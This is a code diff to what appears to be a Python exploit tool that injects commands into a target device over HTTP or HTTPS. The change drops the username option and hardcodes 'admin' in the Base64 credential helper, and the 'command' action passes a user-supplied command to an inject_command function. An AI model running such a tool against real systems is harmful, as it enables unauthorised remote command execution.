@@ -40,10 +40,10 @@ def setup_logging(verbose=False, log_file=None):
 # Utility Functions
 
 
-def encode_credentials(username, password):
+def encode_credentials(password):
     """Base64 encode the username and password."""
     if password:
-        credentials = f"{username}:{password}"
+        credentials = f"admin:{password}"
         return base64.b64encode(credentials.encode('utf-8')).decode('utf-8')
     return None
 
@@ -222,8 +222,6 @@ def setup_subparsers(parser):
                                help="target IP address")
         subparser.add_argument(
             'rport', choices=['80', '443'], help="target port (80 or 443)")
-        subparser.add_argument('--username', default='admin',
-                               help="username for authentication [default: admin]")
         subparser.add_argument(
             '--password', help="password for authentication")
 
@@ -288,8 +286,7 @@ def main():
     setup_logging(args.verbose, args.log_file)
 
     # Execute actions based on parsed arguments
-    credentials = encode_credentials(
-        args.username, args.password) if args.password else None
+    credentials = encode_credentials(args.password) if args.password else None
 
     if args.action == 'command':
         inject_command(args.rhost, args.rport, args.cmd, credentials)
